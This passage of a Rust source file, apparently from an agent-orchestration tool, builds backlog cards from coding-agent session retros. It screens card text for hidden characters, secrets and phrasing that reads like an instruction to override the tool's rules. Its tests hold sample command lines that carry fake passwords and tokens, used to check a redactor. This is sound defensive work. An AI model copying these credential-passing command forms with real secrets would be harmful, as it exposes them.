                    format!("finding fixed by {}", py_str(job)),
                ));
            }
        }
        let admit: Vec<Value> = clean
            .iter()
            .filter(|(i, ..)| !skipped.iter().any(|(k, _)| k == i))
            .map(|(_, s, _)| (*s).clone())
            .collect();
        if admit.is_empty() {
            return Err(fail(
                "every clean card's finding is already fixed; findings.md written, no cards admitted",
                3,
            ));
        }
        let cards =
            json!({"schema": SUGGESTION_SCHEMA, "by": "retro", "run": run, "suggestions": admit});
        write_atomic(
            &suggestions_path,
            (dumps(&cards, INDENT2) + "\n").as_bytes(),
        )
        .map_err(|e| fail(os_error(&e, Some(&suggestions_path)), 1))?;
        backlog_admit(&cards, &mut outcomes)
    })();
    link_red_flags(home, &agg, &up_cards, &outcomes);
    upload(
        home,
        run,
        &agg,
        &reply_findings,
        rejected.len(),
        &up_cards,
        &up_links,
        &outcomes,
    )?;
    result
}

/// The first violation of retro card i as "suggestions[i]...: <problem>", or None.
fn check_retro_card(s: &Value, run: &str, i: usize) -> Option<String> {
    let doc = json!({"schema": SUGGESTION_SCHEMA, "by": "retro", "run": run, "suggestions": [s]});
    check_suggestions(&doc, "retro")
        .map(|e| e.replacen("suggestions[0]", &format!("suggestions[{i}]"), 1))
}

/// The error in a retro card's finding link, or None. A link is one finding number from 1 to total, or a
/// list of 1 to total distinct ones.
fn check_finding_link(link: &Value, total: usize) -> Option<String> {
    let number =
        |n: &Value| is_int(n) && n.as_i64().is_some_and(|n| (1..=total as i64).contains(&n));
    let ok = match link {
        Value::Array(items) => {
            let distinct: BTreeSet<i64> = items.iter().filter_map(Value::as_i64).collect();
            (1..=total).contains(&items.len())
                && items.iter().all(number)
                && distinct.len() == items.len()
        }
        other => number(other),
    };
    (!ok).then(|| {
        "must be a finding number from 1 to total, or a list of distinct finding numbers"
            .replace("total", &total.to_string())
    })
}

/// The first violation of one retro lesson card as (field, problem), or None.
fn check_lesson_card(c: &Value, agg: &Value) -> Option<(Option<&'static str>, String)> {
    if let Some(err) = check_keys(c, &["job", "fact", "why"], &[]) {
        return Some((None, err));
    }
    let jobs: Vec<&Value> = agg["lessons"]
        .as_array()
        .into_iter()
        .flatten()
        .map(|r| &r["job"])
        .collect();
    if !jobs.contains(&&c["job"]) {
        return Some((
            Some("job"),
            "must be a job in aggregate.json lessons".into(),
        ));
    }
    check_text(&c["fact"], 1, 200, false)
        .map(|e| (Some("fact"), e))
        .or_else(|| check_text(&c["why"], 1, 300, false).map(|e| (Some("why"), e)))
}

/// Queue each checked lesson card as a held backlog line while autonomy runs. A bad card is rejected and a
/// fact already in its project's notes.md is skipped; neither stops admit.
fn queue_lessons(home: &Path, agg: &Value, cards: &Value) -> Res<()> {
    let mut autonomy: Option<Value> = None;
    for (i, c) in cards.as_array().into_iter().flatten().enumerate() {
        if let Some((field, problem)) = check_lesson_card(c, agg) {
            let at = field.map(|f| format!(".{f}")).unwrap_or_default();
            println!("rejected lesson_cards[{i}]{at}: {problem}");
            continue;
        }
        let row = agg["lessons"]
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["job"] == c["job"])
            .unwrap();
        let project = py_str(&row["project"]);
        let file = format!("{project}/notes.md");
        let fact = py_str(&c["fact"]);
        let text = agg
            .get("documents")
            .and_then(|d| d.get(&file))
            .and_then(|d| d.get("text"))
            .and_then(Value::as_str)
            .unwrap_or("");
        if text
            .split('\n')
            .any(|l| l == format!("- {fact}") || l.starts_with(&format!("- {fact} (")))
        {
            println!("skipped lesson_cards[{i}]: already in {file}");
            continue;
        }
        if autonomy.is_none() {
            let board = load_board(Some(
                &api(home, "GET", "/api/board", None, &[200], &[])?.text()?,
            ))?;
            autonomy = Some(load_autonomy(&board));
        }
        if autonomy.as_ref().unwrap()["paused"] != false {
            println!("skipped lesson_cards[{i}]: autonomy is paused");
            continue;
        }
        crate::commands::pipeline::queue_lesson_line(
            &project,
            &py_str(&c["job"]),
            &fact,
            &py_str(&c["why"]),
        )?;
    }
    Ok(())
}

/// The backlog context for a schema-checked retro card: a Recommend line, the summary, why the recommended
/// option, the evidence, the Retro provenance line and one needs.md question.
fn backlog_context(s: &Value, run: &str, fp: &str, created: &str) -> String {
    let one_line = |t: &Value| py_str(t).split_whitespace().collect::<Vec<_>>().join(" ");
    let sentence = |t: String| {
        if t.ends_with(['.', '!', '?']) {
            t
        } else {
            t + "."
        }
    };
    let options = s["options"].as_array().unwrap();
    let rec = options.iter().find(|o| o["key"] == s["recommend"]).unwrap();
    let title = py_str(&s["title"]);
    let header = if title.chars().count() <= 60 {
        title
    } else {
        title.chars().take(57).collect::<String>() + "..."
    };
    let mut lines = vec![
        "Recommend: approve".to_string(),
        String::new(),
        one_line(&s["summary"]),
        String::new(),
        format!("Why {}: {}", py_str(&rec["label"]), one_line(&s["reason"])),
        String::new(),
        "Evidence:".into(),
    ];
    for e in s["evidence"].as_array().unwrap() {
        let n = e["sessions"].as_array().map_or(0, Vec::len);
        let plural = if n == 1 { "" } else { "s" };
        lines.push(format!(
            "- {}x {} ({n} session{plural})",
            py_str(&e["count"]),
            py_str(&e["note"])
        ));
    }
    lines.extend([
        String::new(),
        format!("Retro: run {run}, fingerprint {fp}, created {created}"),
        String::new(),
        format!("## Question: {header}"),
        py_str(&s["question"]),
        "Pick: one".into(),
    ]);
    let ordered = std::iter::once(rec).chain(options.iter().filter(|o| !std::ptr::eq(*o, rec)));
    for o in ordered {
        let mark = if std::ptr::eq(o, rec) {
            " (recommended)"
        } else {
            ""
        };
        let mut row = format!(
            "- {}{mark}: {}",
            py_str(&o["label"]),
            sentence(py_str(&o["detail"]))
        );
        let joined = |k: &str| {
            o[k].as_array()
                .map(|a| a.iter().map(|x| py_str(x)).collect::<Vec<_>>().join("; "))
        };
        if let Some(pros) = joined("pros").filter(|p| !p.is_empty() || truthy(&o["pros"])) {
            row += &format!(" Pros: {pros}.");
        }
        if let Some(cons) = joined("cons").filter(|c| !c.is_empty() || truthy(&o["cons"])) {
            row += &format!(" Cons: {cons}.");
        }
        lines.push(row);
    }
    lines.join("\n")
}

/// {"fingerprint", "created", "project", "open"} for each Retro provenance line indented under a backlog
/// line, checked or not.
fn retro_marks(text: &str) -> Vec<Value> {
    let mut marks = Vec::new();
    let mut under: Option<(String, bool)> = None;
    for line in text.split('\n') {
        let line = line.trim_end_matches('\r');
        if let Some(m) = BACKLOG_ITEM.match_start(line) {
            under = Some((m[2].to_string(), &m[1] == " "));
        } else if under.is_some() && line.starts_with("  ") && RETRO_MARK.is_full(&line[2..]) {
            let parts: Vec<&str> = line[2..]
                .split(", ")
                .map(|p| p.rsplit_once(' ').map_or(p, |(_, v)| v))
                .collect();
            let (project, open) = under.clone().unwrap();
            marks.push(json!({"fingerprint": parts[1], "created": parts[2], "project": project, "open": open}));
        } else if !line.is_empty() && !line.starts_with("  ") {
            under = None;
        }
    }
    marks
}

/// Add each checked retro card as a held backlog line with a decision form. Skips duplicates and cards over a
/// cap, and exits 3 when autonomy is paused or nothing was added. Appends (fingerprint, result) per card.
fn backlog_admit(cards: &Value, outcomes: &mut Vec<(String, String)>) -> Res<()> {
    let home = factory_home()?;
    let projects = crate::commands::intake::registered(&home)?;
    let suggestions = cards["suggestions"].as_array().unwrap();
    for (i, s) in suggestions.iter().enumerate() {
        let slug = py_str(&s["project"]);
        if !projects.contains(&slug) {
            return Err(fail(
                format!("suggestions[{i}].project: {slug} is not a registered factory project; nothing admitted"),
                2,
            ));
        }
    }
    let data = load_board(Some(
        &api(&home, "GET", "/api/board", None, &[200], &[])?.text()?,
    ))?;
    if load_autonomy(&data)["paused"] != false {
        return Err(fail("autonomy is paused; nothing admitted", 3));
    }
    let r = api(&home, "GET", "/api/backlog", None, &[200, 404], &[])?;
    let marks = retro_marks(&if r.status == 200 {
        r.text()?
    } else {
        String::new()
    });
    let jobs = data["jobs"].as_array().cloned().unwrap_or_default();
    let origins: Vec<(&Value, &Value)> = jobs
        .iter()
        .filter_map(|j| j.get("origin").filter(|o| o.is_object()).map(|o| (j, o)))
        .collect();
    let archived = data
        .get("archived")
        .filter(|a| a.is_object())
        .and_then(|a| a.get("fingerprints"))
        .filter(|f| f.is_object())
        .cloned()
        .unwrap_or(json!({}));
    let cutoff = unix_now() - 86_400;
    let daily = origins
        .iter()
        .filter(|(j, _)| created_since(j, cutoff))
        .count()
        + marks
            .iter()
            .filter(|m| created_since(&json!({"origin": m}), cutoff))
            .count();
    let (mut admitted, mut added, mut skipped): (Vec<String>, Vec<String>, Vec<Value>) =
        (Vec::new(), Vec::new(), Vec::new());
    for s in suggestions {
        let slug = py_str(&s["project"]);
        let title = py_str(&s["title"]);
        let fp = fingerprint(&slug, s);
        let dup = origins
            .iter()
            .find(|(_, o)| o.get("fingerprint").and_then(Value::as_str) == Some(fp.as_str()))
            .map(|(j, _)| j.get("id").cloned().unwrap_or(Value::Null))
            .filter(|d| truthy(d))
            .or_else(|| archived.get(&fp).cloned())
            .filter(|d| truthy(d));
        let context = backlog_context(s, run_of(cards), &fp, &now());
        let why = backlog_context_error(&context).or_else(|| {
            (RETRO_MARK.find_iter(&context).count() != 1)
                .then(|| "more than one Retro line".to_string())
        });
        let open = origins
            .iter()
            .filter(|(j, o)| {
                j.get("stage").and_then(Value::as_str) == Some(IDEA)
                    && py_str(&o["project"]) == slug
            })
            .count()
            + marks
                .iter()
                .filter(|m| m["open"] == true && py_str(&m["project"]) == slug)
                .count()
            + added.iter().filter(|a| **a == slug).count();
        let reason = if let Some(dup) = dup {
            format!("duplicate {}", py_str(&dup))
        } else if marks.iter().any(|m| m["fingerprint"] == fp.as_str()) {
            "duplicate in backlog".into()
        } else if daily + added.len() >= MAX_PER_DAY {
            "daily cap".into()
        } else if open >= MAX_OPEN_PER_PROJECT {
            "open cap".into()
        } else if BACKLOG_SUFFIX.search(&title).is_some() {
            "title ends in a backlog ref".into()
        } else if let Some(why) = why {
            format!("context: {why}")
        } else if !backlog_add(&home, &format!("{slug}: {title}"), Some(&context))? {
            "already in backlog".into()
        } else {
            admitted.push(format!("{slug}: {title}"));
            added.push(slug);
            outcomes.push((fp, "admitted".into()));
            continue;
        };
        skipped.push(json!({"title": s["title"], "reason": reason}));
        outcomes.push((fp, reason));
    }
    println!(
        "{}",
        dumps(&json!({"admitted": admitted, "skipped": skipped}), INDENT2)
    );
    if admitted.is_empty() {
        return Err(exit(3));
    }
    Ok(())
}

fn run_of(cards: &Value) -> &str {
    cards["run"].as_str().unwrap_or("")
}

/// POST each admitted red-flag card's backlog line onto the aggregate red_flags rows it groups. Errors print
/// to stderr and never change the exit code.
fn link_red_flags(home: &Path, agg: &Value, cards: &[&Value], outcomes: &[(String, String)]) {
    for s in cards {
        let Some(m) = RED_FLAG_TITLE.fullmatch(s["title"].as_str().unwrap_or("")) else {
            continue;
        };
        let fp = fingerprint(&py_str(&s["project"]), s);
        if !outcomes.iter().any(|(f, r)| *f == fp && r == "admitted") {
            continue;
        }
        let (flag, tool) = (m[1].to_string(), m[2].to_string());
        let rows: Vec<Value> = agg["red_flags"]
            .as_array()
            .into_iter()
            .flatten()
            .filter(|r| {
                r.get("tool").and_then(Value::as_str) == Some(tool.as_str())
                    && r.get("flags")
                        .and_then(Value::as_array)
                        .is_some_and(|f| f.iter().any(|x| x == flag.as_str()))
            })
            .take(500)
            .map(|r| {
                let mut row = Map::new();
                for k in ["time", "job", "host", "agent", "tool", "target"] {
                    row.insert(k.into(), r[k].clone());
                }
                Value::Object(row)
            })
            .collect();
        if rows.is_empty() {
            continue;
        }
        let item = format!("{}: {}", py_str(&s["project"]), py_str(&s["title"]));
        let body = dumps(
            &json!({"backlog": format!("- [ ] {item}"), "rows": rows}),
            DEFAULT,
        );
        let sent = api(
            home,
            "POST",
            "/api/audit-flags/backlog",
            Some(body.as_bytes()),
            &[200, 400, 403, 404, 413, 503],
            &[("Content-Type", "application/json")],
        )
        .and_then(|r| Ok((r.status, r.text()?)));
        match sent {
            Ok((200, text)) => {
                let n = loads(&text)
                    .ok()
                    .map_or(Value::Null, |v| v["linked"].clone());
                let plural = if n == 1 { "" } else { "s" };
                println!("linked {} red-flag row{plural} to {item}", py_str(&n));
            }
            Ok((status, text)) => eprintln!(
                "red-flag link failed: {status} {}",
                printable_line(&text, 200)
            ),
            Err(e) => eprint!("{}", e.stderr),
        }
    }
}

fn check_text(value: &Value, lo: usize, hi: usize, multiline: bool) -> Option<String> {
    let text = value
        .as_str()
        .filter(|t| (lo..=hi).contains(&t.chars().count()));
    let Some(text) = text else {
        return Some(format!("must be a string of {lo}-{hi} characters"));
    };
    if ["```", "~~~", "://"].iter().any(|f| text.contains(f)) {
        return Some("must not hold a code fence or a link".into());
    }
    // C0 and C1 control characters and the Unicode line and paragraph separators.
    let control = |c: char| {
        let n = c as u32;
        (n < 32 || (127..160).contains(&n) || c == '\u{2028}' || c == '\u{2029}')
            && !(multiline && c == '\n')
    };
    if text.chars().any(control) {
        let tail = if multiline { "" } else { " or line breaks" };
        return Some(format!("must not hold control characters{tail}"));
    }
    check_untrusted(text)
}

/// The reason for the first admission rule (3-7) text breaks, or None.
fn check_untrusted(text: &str) -> Option<String> {
    if NOTE_INVISIBLE.search(text).is_some() {
        return Some("contains control, invisible or bidirectional characters".into());
    }
    if has_envelope_tag(text) {
        return Some("contains the reserved envelope tag".into());
    }
    if NOTE_LINK.search(text).is_some() {
        return Some("links are not allowed".into());
    }
    if NOTE_SECRETS.iter().any(|p| p.search(text).is_some()) {
        return Some("looks like a secret".into());
    }
    NOTE_PHRASES
        .iter()
        .find(|(_, p)| p.search(text).is_some())
        .map(|(rule, _)| format!("reads like an instruction to override factory rules ({rule})"))
}

/// `type(v) is int` for a parsed JSON value.
fn is_int(v: &Value) -> bool {
    matches!(v, Value::Number(n) if !n.to_string().contains(['.', 'e', 'E']))
}

/// `f"{n:,}"`.
fn commas(n: i64) -> String {
    let digits = n.unsigned_abs().to_string();
    let mut out = String::new();
    for (i, c) in digits.chars().enumerate() {
        if i > 0 && (digits.len() - i) % 3 == 0 {
            out.push(',');
        }
        out.push(c);
    }
    if n < 0 {
        out.insert(0, '-');
    }
    out
}

/// `int(statistics.median(values))`, or 0 for none.
fn median(mut values: Vec<i64>) -> i64 {
    if values.is_empty() {
        return 0;
    }
    values.sort();
    let mid = values.len() / 2;
    if values.len() % 2 == 1 {
        values[mid]
    } else {
        ((values[mid - 1] + values[mid]) as f64 / 2.0) as i64
    }
}

/// `retro_int`: a whole number's value, else 0.
fn int_of(v: Option<&Value>) -> i64 {
    match v {
        Some(v) if is_int(v) => v.as_i64().unwrap_or(0),
        _ => 0,
    }
}

/// `doc == {"none": True}`.
fn is_none_reply(doc: &Value) -> bool {
    let Value::Object(map) = doc else {
        return false;
    };
    map.len() == 1
        && match map.get("none") {
            Some(Value::Bool(b)) => *b,
            Some(Value::Number(n)) => n.as_f64() == Some(1.0),
            _ => false,
        }
}

fn days_from_civil(y: i64, m: i64, d: i64) -> i64 {
    let y = if m <= 2 { y - 1 } else { y };
    let era = y.div_euclid(400);
    let yoe = y.rem_euclid(400);
    let mp = if m > 2 { m - 3 } else { m + 9 };
    let doy = (153 * mp + 2) / 5 + d - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    era * 146_097 + doe - 719_468
}

fn civil_from_days(days: i64) -> (i64, i64, i64) {
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    (yoe + era * 400 + i64::from(m <= 2), m, d)
}

fn month_days(y: i64, m: i64) -> i64 {
    let leap = y % 4 == 0 && (y % 100 != 0 || y % 400 == 0);
    [
        31,
        if leap { 29 } else { 28 },
        31,
        30,
        31,
        30,
        31,
        31,
        30,
        31,
        30,
        31,
    ][(m - 1) as usize]
}

/// `retro_date`: `YYYY-MM-DD` naming a real day.
fn is_date(d: &str) -> bool {
    let b = d.as_bytes();
    if b.len() != 10 || b[4] != b'-' || b[7] != b'-' {
        return false;
    }
    let num = |r: std::ops::Range<usize>| {
        b[r].iter().try_fold(0i64, |n, c| {
            c.is_ascii_digit().then(|| n * 10 + i64::from(c - b'0'))
        })
    };
    match (num(0..4), num(5..7), num(8..10)) {
        (Some(y), Some(m), Some(day)) => {
            y >= 1 && (1..=12).contains(&m) && day >= 1 && day <= month_days(y, m)
        }
        _ => false,
    }
}

/// `date` moved by days, as `YYYY-MM-DD`.
fn shift_date(date: &str, days: i64) -> String {
    let n = |r: std::ops::Range<usize>| date[r].parse::<i64>().unwrap();
    let (y, m, d) = civil_from_days(days_from_civil(n(0..4), n(5..7), n(8..10)) + days);
    format!("{y:04}-{m:02}-{d:02}")
}

/// `retro_when`: an ISO time with an offset, as UTC microseconds, per Python 3.8's `fromisoformat`.
fn when(v: Option<&Value>) -> Option<i128> {
    let text = v?.as_str()?.replace('Z', "+00:00");
    let s: Vec<char> = text.chars().collect();
    let digits = |from: usize, count: usize| -> Option<i128> {
        let part = s.get(from..from + count)?;
        part.iter().try_fold(0i128, |n, c| {
            c.is_ascii_digit()
                .then(|| n * 10 + i128::from(*c as u8 - b'0'))
        })
    };
    if s.len() < 10 || s[4] != '-' || s[7] != '-' {
        return None;
    }
    let (y, m, d) = (digits(0, 4)?, digits(5, 2)?, digits(8, 2)?);
    if y < 1 || !(1..=12).contains(&m) || d < 1 || d > i128::from(month_days(y as i64, m as i64)) {
        return None;
    }
    // HH[:MM[:SS[.fff or .ffffff]]] as microseconds and the next index. An offset skips the range check.
    let clock = |at: usize, check: bool| -> Option<(i128, usize)> {
        let h = digits(at, 2)?;
        let mut i = at + 2;
        let (mut mi, mut sec, mut us) = (0, 0, 0);
        if s.get(i) == Some(&':') {
            mi = digits(i + 1, 2)?;
            i += 3;
            if s.get(i) == Some(&':') {
                sec = digits(i + 1, 2)?;
                i += 3;
                if s.get(i) == Some(&'.') {
                    let n = (i + 1..s.len())
                        .take_while(|&j| s[j].is_ascii_digit())
                        .count();
                    us = match n {
                        3 => digits(i + 1, 3)? * 1000,
                        6 => digits(i + 1, 6)?,
                        _ => return None,
                    };
                    i += 1 + n;
                }
            }
        }
        if check && (h > 23 || mi > 59 || sec > 59) {
            return None;
        }
        Some(((h * 3600 + mi * 60 + sec) * 1_000_000 + us, i))
    };
    if s.len() == 10 {
        return None;
    }
    let (time, i) = clock(11, true)?;
    let sign = match s.get(i) {
        Some('+') => 1,
        Some('-') => -1,
        _ => return None,
    };
    let (offset, end) = clock(i + 1, false)?;
    if end != s.len() || offset >= 86_400 * 1_000_000 {
        return None;
    }
    let days = i128::from(days_from_civil(y as i64, m as i64, d as i64));
    Some(days * 86_400 * 1_000_000 + time - sign * offset)
}

/// `datetime.now().date().isoformat()`.
fn local_today() -> String {
    let now = unix_now();
    format_stamp(now + crate::commands::pickup::local_offset(now))[..10].to_string()
}

/// A new run name: the UTC stamp, then 6 random hex digits.
fn run_name() -> String {
    let stamp = format_stamp(unix_now()).replace(['-', ':'], "");
    let mut h = RandomState::new().build_hasher();
    h.write_u128(
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos(),
    );
    format!("{stamp}-{:06x}", h.finish() & 0xff_ffff)
}

/// Whether text holds an operator-preferences tag as written or once NFKC and the look-alike fold apply.
fn has_envelope_tag(text: &str) -> bool {
    let folded: String = nfkc(text).chars().map(tag_lookalike).collect();
    NOTE_TAG.search(text).is_some() || NOTE_TAG.search(&folded).is_some()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::shared::fs::temp_dir;
    use serde_json::json;
    use std::time::{Duration, Instant};

    const SLUG: &str = "-home-u--paseo-worktrees-ab12-factory-1017-add-x";

    fn copy_dir(from: &Path, to: &Path) {
        fs::create_dir_all(to).unwrap();
        for entry in fs::read_dir(from).unwrap().flatten() {
            if entry.path().is_dir() {
                copy_dir(&entry.path(), &to.join(entry.file_name()));
            } else {
                fs::copy(entry.path(), to.join(entry.file_name())).unwrap();
            }
        }
    }

    /// A temp folder holding a copy of tests/fixtures/retro/projects, as RetroCase sets up.
    fn projects(name: &str) -> PathBuf {
        let root = temp_dir(&format!("retro-{name}"));
        let fixture =
            Path::new(env!("CARGO_MANIFEST_DIR")).join("../../tests/fixtures/retro/projects");
        copy_dir(&fixture, &root.join("projects"));
        root.join("projects")
    }

    fn session(projects: &Path, slug: &str, name: &str, entries: &[Value]) -> PathBuf {
        let path = projects.join(slug).join(format!("{name}.jsonl"));
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        let mut text = String::new();
        for e in entries {
            let mut line = Map::new();
            line.insert("timestamp".into(), json!("2026-11-10T10:00:00Z"));
            line.extend(e.as_object().unwrap().clone());
            text += &(dumps(&Value::Object(line), DEFAULT) + "\n");
        }
        fs::write(&path, text).unwrap();
        path
    }

    fn scan_of(projects: &Path, entries: &[Value]) -> Value {
        scan(&session(projects, "-home-u-scratch", "s2", entries), true).unwrap()
    }

    fn digest_of(projects: &Path, days: f64) -> Vec<Value> {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs_f64();
        rows_in(
            projects,
            "host-x",
            "/nonexistent/home",
            now - days * 86400.0,
        )
    }

    fn assistant(mid: &str, tools: &[(&str, Value)]) -> Value {
        let content: Vec<Value> = tools
            .iter()
            .enumerate()
            .map(|(n, (name, inp))| json!({"type": "tool_use", "id": format!("{mid}-{n}"), "name": name, "input": inp}))
            .collect();
        json!({"type": "assistant", "timestamp": "2026-11-10T10:00:00Z",
               "message": {"id": mid, "model": "claude-opus-5-5", "usage": {"input_tokens": 1}, "content": content}})
    }

    fn result(mid: &str, text: &str, is_error: bool, n: usize) -> Value {
        json!({"type": "user", "message": {"content": [
            {"type": "tool_result", "tool_use_id": format!("{mid}-{n}"), "is_error": is_error, "content": text}]}})
    }

    fn bash(cmd: &str) -> (&'static str, Value) {
        ("Bash", json!({"command": cmd}))
    }

    fn strings_in(v: &Value, out: &mut Vec<String>) {
        match v {
            Value::String(s) => out.push(s.clone()),
            Value::Array(items) => items.iter().for_each(|i| strings_in(i, out)),
            Value::Object(map) => map.iter().for_each(|(k, v)| {
                out.push(k.clone());
                strings_in(v, out)
            }),
            _ => {}
        }
    }

    fn all_clipped(rows: &[Value]) -> bool {
        let mut found = Vec::new();
        rows.iter().for_each(|r| strings_in(r, &mut found));
        found.iter().all(|s| s.chars().count() <= 160)
    }

    #[test]
    fn redact_running_example_and_header_shapes() {
        let text = "CF_API_TOKEN=xyz curl -H 'Authorization: Bearer abc' https://ci:hunter2@git.example.test/r"; // gitleaks:allow
        assert_eq!(
            pattern(text),
            "CF_API_TOKEN=[redacted] curl -H 'Authorization: [redacted]' https:<path>"
        );
        for (text, secret) in [
            ("Cookie: session=c00kie-value", "c00kie"),
            ("set-cookie: sid=abc; Path=/", "sid=abc"),
            ("proxy-authorization: Basic dXNlcjpw", "dXNlcjpw"),
            ("X-Api-Key: k3y-value", "k3y"),
            ("cf-access-client-secret: s3cr3t-value", "s3cr3t"),
            ("retry with bearer eyJabc.def-ghi", "eyJabc"),
            ("ssh://git:pw0rd@host.example.test/r", "pw0rd"), // gitleaks:allow
            ("db_password = \"two words\"", "two words"),
            ("GH_TOKEN=gh-value", "gh-value"),
            ("client_credential: cred-value", "cred-value"),
            ("passwd=pw-value", "pw-value"),
            ("{\"token\":\"abcdefsecret\"}", "abcdef"),
            ("{\"api_key\": \"zzsecretvalue123\"}", "zzsecret"), // gitleaks:allow
            ("mysql --password hunter2 db", "hunter"),
            ("gh auth login --with-token abc-tok", "abc-tok"),
            ("curl -u ci:hunter2 https://example.test", "hunter"), // gitleaks:allow
            ("curl --user=ci:hunter2 https://example.test", "hunter"), // gitleaks:allow
            ("Authorization=Basic dXNlcjpw", "dXNlcjpw"),
            ("{'token': 'abcsecret'}", "abcsecret"),
            ("{'password': 'hunter2'}", "hunter"),
            ("{'Cookie': 'session=abc'}", "session=abc"),
            ("{'Authorization': 'Basic dXNl'}", "dXNl"),
            ("{\\\"token\\\":\\\"abc123secret\\\"}", "abc123"),
            ("--api_key hunter2", "hunter"),
            ("-u ci:hunter2 https://example.test", "hunter"), // gitleaks:allow
        ] {
            let out = retro_redact(text);
            assert!(
                !out.contains(secret) && out.contains("[redacted]"),
                "{text}: {out}"
            );
        }
        for (text, kept) in [
            ("{\"token\":\"abcdefsecret\"}", "{\"token\":[redacted]}"),
            ("CF_API_TOKEN=xyz curl", "CF_API_TOKEN=[redacted] curl"),
            ("git push -u origin main", "git push -u origin main"),
        ] {
            assert_eq!(retro_redact(text), kept);
        }
    }

    #[test]
    fn redact_numeric_uid_gid_is_kept() {
        for text in [
            "docker run -u 1000:1000 img",
            "docker run --user=0:0 img",
            "docker run -u=1000:1000 img",
        ] {
            assert_eq!(retro_redact(text), text);
        }
        for text in [
            "docker run -u ci:hunter2 img", // gitleaks:allow
            "docker run -u 1000:pw img",
            "docker run --user=1000:pw img",
            "docker run -u 1000:1000x img",
        ] {
            assert!(retro_redact(text).contains("[redacted]"), "{text}");
        }
    }

    #[test]
    fn redact_tool_call_credential_forms() {
        for (text, out) in [
            (
                "mysql -u root -phunter2 db",
                "mysql -u root -p[redacted] db",
            ), // gitleaks:allow
            (
                "sshpass -p hunter2 ssh host",
                "sshpass -p [redacted] ssh host",
            ), // gitleaks:allow
            ("MYSQL_PWD=hunter2 mysql", "MYSQL_PWD=[redacted] mysql"), // gitleaks:allow
            (
                "curl -H Authorization:\\ Bearer\\ abc123 x",
                "curl -H Authorization:\\[redacted]",
            ),
            ("mariadb-dump -phunter2 db", "mariadb-dump -p[redacted] db"), // gitleaks:allow
            ("mysql -p\"hunter 2\" db", "mysql -p[redacted] db"),          // gitleaks:allow
            (
                "sshpass -phunter2 ssh host",
                "sshpass -p[redacted] ssh host",
            ), // gitleaks:allow
            ("redis-cli -a hunter2 ping", "redis-cli -a [redacted] ping"), // gitleaks:allow
            (
                "redis-cli --pass hunter2 ping",
                "redis-cli --pass [redacted] ping",
            ), // gitleaks:allow
            (
                "docker login -u me -p hunter2 ghcr.io",
                "docker login -u me -p [redacted] ghcr.io",
            ), // gitleaks:allow
            (
                "openssl rsa -passin pass:hunter2",
                "openssl rsa -passin pass:[redacted]",
            ), // gitleaks:allow
            (
                "SSHPASS=hunter2 sshpass -e ssh h",
                "SSHPASS=[redacted] sshpass -e ssh h",
            ), // gitleaks:allow
            (
                "REDISCLI_AUTH=hunter2 redis-cli ping",
                "REDISCLI_AUTH=[redacted] redis-cli ping",
            ), // gitleaks:allow
            (
                "redis-cli -a hunter2 ping && ls -a /tmp",
                "redis-cli -a [redacted] ping && ls -a /tmp",
            ), // gitleaks:allow
            (
                "curl -H Authorization:\\ Bearer\\ abc\\$x",
                "curl -H Authorization:\\[redacted]",
            ),
            (
                "openssl enc -aes-256-cbc -k hunter2 -in a.txt",
                "openssl enc -aes-256-cbc -k [redacted] -in a.txt",
            ), // gitleaks:allow
            (
                "openssl enc -K 00ff -iv 01 -in a",
                "openssl enc -K [redacted] -iv 01 -in a",
            ), // gitleaks:allow
            (
                "openssl enc -k \"a|b\" -in x",
                "openssl enc -k [redacted] -in x",
            ), // gitleaks:allow
            (
                "openssl enc -k 'a;b' -in x",
                "openssl enc -k [redacted] -in x",
            ), // gitleaks:allow
            (
                "openssl rsa -passin hunter2 -in key.pem",
                "openssl rsa -passin [redacted] -in key.pem",
            ), // gitleaks:allow
            (
                "openssl pkcs12 -export -passout hunter2 -in a",
                "openssl pkcs12 -export -passout [redacted] -in a",
            ), // gitleaks:allow
            (
                "echo hunter2 | docker login ghcr.io -u me --password-stdin", // gitleaks:allow
                "echo [redacted] | docker login ghcr.io -u me --password-stdin",
            ),
            (
                "echo -n \"hunter 2\" | docker login ghcr.io -u me --password-stdin", // gitleaks:allow
                "echo -n [redacted] | docker login ghcr.io -u me --password-stdin",
            ),
        ] {
            assert_eq!(retro_redact(text), out, "{text}");
        }
    }

    #[test]
    fn redact_tool_call_lookalikes_kept() {
        for (text, out) in [
            ("mysql -u root -p db", "mysql -u root -p db"),
            ("mkdir -p a/b && ps -p 123", "mkdir -p a/b && ps -p 123"),
            (
                "sshpass -p hunter2 ssh -p 2222 host",
                "sshpass -p [redacted] ssh -p 2222 host",
            ), // gitleaks:allow
            (
                "sshpass -f pw.txt ssh -p 2222 host",
                "sshpass -f pw.txt ssh -p [redacted] host",
            ),
        ] {
            assert_eq!(retro_redact(text), out, "{text}");
        }
        for text in [
            "redis-cli -h h -p 6379 ping",
            "docker run -p 8080:80 nginx",
            "docker login ghcr.io",
            "openssl rsa -passin env:KEY_PW",
            "openssl rsa -passin file:pw.txt",
            "sshpass -e ssh host",
            "export SSHPASS",
            "openssl enc -d -kfile pw.txt -in a",
            "openssl rsa -passin stdin",
            "openssl rsa -passin fd:3",
            "openssl version && curl -k https://example.test",
            "cat pw.txt | docker login ghcr.io -u me --password-stdin",
            "echo hunter2 | grep h",
            "echo hi; docker login ghcr.io",
        ] {
            assert_eq!(retro_redact(text), text);
        }
    }

    #[test]
    #[cfg_attr(debug_assertions, ignore = "timing runs under --release")]
    fn redact_long_name_run_redacts_in_linear_time() {
        let a = "a".repeat(30000);
        for text in [
            a.clone(),
            "-".repeat(30000),
            "a1".repeat(15000),
            format!("--{a}"),
            format!("\"{a}"),
        ] {
            let start = Instant::now();
            assert_eq!(retro_redact(&text), text);
            assert!(start.elapsed() < Duration::from_secs(1), "{}", &text[..3]);
        }
        let x = "x".repeat(63);
        assert_eq!(
